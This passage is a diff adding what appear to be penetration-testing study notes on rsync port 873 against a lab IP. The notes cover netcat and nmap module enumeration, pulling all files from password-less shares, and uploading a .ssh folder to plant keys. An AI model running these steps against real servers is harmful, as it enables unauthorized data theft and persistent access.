@@ -1,0 +1,18 @@
+ rsync(873) client commands:
+    - Enumerate:
+        > nc -nv 192.168.131.126 873
+            - Banner should show, type same thing
+            > @RSYNCD: 31.0
+            > #list
+            - Should list all directories
+            - connect again, type banner, now type the shared folder name. if "@RSYNCD: OK" displays you can access without password
+        > nmap -sV --script "rsync-list-modules" -p 873 192.168.131.126
+    - Pull files
+        > mkdir rsync/
+        - The following will copy over all files and folders locally to your system
+        - No password
+            > rsync -av rsync://192.168.131.126/fox ./fox
+        - With password
+            > rsync -av rsync://username@192.168.131.126/fox ./fox
+    - Put files
+        > rsync -av home_user/.ssh/ rsync://192.168.131.126/fox/.ssh
